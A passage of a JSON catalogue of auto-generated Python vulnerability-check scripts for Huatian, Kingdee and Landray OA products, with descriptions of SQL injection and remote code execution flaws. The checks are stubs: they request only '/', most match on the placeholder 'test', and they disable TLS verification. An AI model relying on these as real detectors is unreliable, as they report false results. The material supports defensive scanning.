        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: huatian-oa8000-sqli\nName: Huatian Power OA 8000 workFlowService - SQL injection\nSeverity: critical\nDescription: There is a SQL injection vulnerability in the workFlowService interface of Huatian Power OA 8000 version, through which an attacker can obtain sensitive database information\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_huatian_oa8000_sqli:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"huatian-oa8000-sqli\"\n    SEVERITY = \"critical\"\n    NAME = \"Huatian Power OA 8000 workFlowService - SQL injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; contains(content_type, \"text/xml\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Huatian Power OA 8000 workFlowService - SQL injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_huatian_oa8000_sqli(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: huatian-oa8000-sqli\nName: Huatian Power OA 8000 workFlowService - SQL injection\nSeverity: critical\nDescription: There is a SQL injection vulnerability in the workFlowService interface of Huatian Power OA 8000 version, through which an attacker can obtain sensitive database information\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_huatian_oa8000_sqli:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"huatian-oa8000-sqli\"\n    SEVERITY = \"critical\"\n    NAME = \"Huatian Power OA 8000 workFlowService - SQL injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; contains(content_type, \"text/xml\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Huatian Power OA 8000 workFlowService - SQL injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_huatian_oa8000_sqli(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "huatian",
          "oa",
          "sqli",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_kingdee_erp_rce",
        "name": "Kingdee OA Yunxingkong kdsvc - Remote Code Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "Kingdee OA Yunxingkong has a remote command execution vulnerability. This vulnerability is caused by the fact that the communication layer of Kingdee Cloud Starry Sky Management Center adopts binary data format by default, which requires serialization and deserialization. No signature or verification is performed during this communication process, leading to malicious exploitation.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'Windows IP, Kingdee.BOS.Core.Metadata.BusinessInfo' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: kingdee-erp-rce\nName: Kingdee OA Yunxingkong kdsvc - Remote Code Execution\nSeverity: critical\nDescription: Kingdee OA Yunxingkong has a remote command execution vulnerability. This vulnerability is caused by the fact that the communication layer of Kingdee Cloud Starry Sky Management Center adopts binary data format by default, which requires serialization and deserialization. No signature or verification is performed during this communication process, leading to malicious exploitation.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_kingdee_erp_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"kingdee-erp-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Kingdee OA Yunxingkong kdsvc - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Windows IP, Kingdee.BOS.Core.Metadata.BusinessInfo' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['Windows IP, Kingdee.BOS.Core.Metadata.BusinessInfo']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Kingdee OA Yunxingkong kdsvc - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_kingdee_erp_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: kingdee-erp-rce\nName: Kingdee OA Yunxingkong kdsvc - Remote Code Execution\nSeverity: critical\nDescription: Kingdee OA Yunxingkong has a remote command execution vulnerability. This vulnerability is caused by the fact that the communication layer of Kingdee Cloud Starry Sky Management Center adopts binary data format by default, which requires serialization and deserialization. No signature or verification is performed during this communication process, leading to malicious exploitation.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_kingdee_erp_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"kingdee-erp-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Kingdee OA Yunxingkong kdsvc - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Windows IP, Kingdee.BOS.Core.Metadata.BusinessInfo' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['Windows IP, Kingdee.BOS.Core.Metadata.BusinessInfo']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Kingdee OA Yunxingkong kdsvc - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_kingdee_erp_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "kingdee-erp",
          "rce",
          "intrusive",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_landray_oa_datajson_rce",
        "name": "Landray OA Datajson S Bean - Remote Code Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "Landray Office Automation (OA) software, specifically in the \"s_bean\" component's \"sysFormulaSimulateByJS\" functionality. This vulnerability allows remote code execution (RCE), enabling attackers to execute arbitrary code on a target system.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code == 200; contains(interactsh_protocol, \"dns\")",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "interactsh",
            "datatype": "string",
            "required": false,
            "description": "URL Interactsh OOB"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: landray-oa-datajson-rce\nName: Landray OA Datajson S Bean - Remote Code Execution\nSeverity: critical\nDescription: Landray Office Automation (OA) software, specifically in the \"s_bean\" component's \"sysFormulaSimulateByJS\" functionality. This vulnerability allows remote code execution (RCE), enabling attackers to execute arbitrary code on a target system.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_landray_oa_datajson_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"landray-oa-datajson-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Landray OA Datajson S Bean - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; contains(interactsh_protocol, \"dns\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Landray OA Datajson S Bean - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_landray_oa_datajson_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
